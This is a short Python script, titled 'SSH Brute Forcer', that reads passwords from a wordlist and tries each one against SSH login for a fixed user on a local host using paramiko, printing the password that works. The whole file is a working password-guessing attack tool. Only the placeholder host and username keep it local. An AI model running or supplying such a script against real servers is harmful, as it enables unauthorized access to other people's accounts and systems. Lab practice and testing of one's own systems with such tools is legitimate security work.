from pwn import *
import paramiko

print("SSH Brute Forcer")
host = "127.0.0.1"
username = "s"
attempt_limit = 0
with open ("common-passwords-win.txt", "r") as f: # Open the password list file
    for line in f:
        password = line.strip()
        attempt_limit += 1
        print(f"Attempt {attempt_limit}: Trying password '{password}' for user '{username}'")
        try:
            ssh = paramiko.SSHClient() # Create SSH client
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Automatically add host keys
            ssh.connect(host, username=username, password=password, timeout=5) # Attempt to connect
            print(f"[+] Success! Password found: '{password}'") # If successful
            ssh.close()
            break
        except paramiko.AuthenticationException:
            print("[-] Authentication failed.")
        except paramiko.SSHException as sshException:
            print(f"[-] Unable to establish SSH connection: {sshException}")
        except Exception as e:
            print(f"[-] Exception occurred: {e}")
            
            
print("Brute force attack completed.")

